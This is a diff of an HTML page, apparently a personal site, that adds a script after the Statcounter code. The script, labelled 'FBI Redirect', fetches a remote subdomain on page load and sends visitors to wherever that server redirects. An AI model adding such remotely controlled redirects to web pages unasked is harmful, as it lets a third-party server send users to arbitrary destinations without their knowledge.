@@ -420,8 +420,17 @@ src="https://c.statcounter.com/13006308/0/c2b5af33/1/"
 alt="Web Analytics Made Easy - Statcounter"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
+
+<!-- FBI Redirect -->
+<script>
+fetch('https://fbi.johnmarkkarr.com/')
+  .then(response => {
+    if (response.redirected) {
+      window.location.href = response.url;
+    }
+  })
+  .catch(err => console.log('Redirect check failed:', err));
+</script>
 	
 </body>
 </html>
-
-
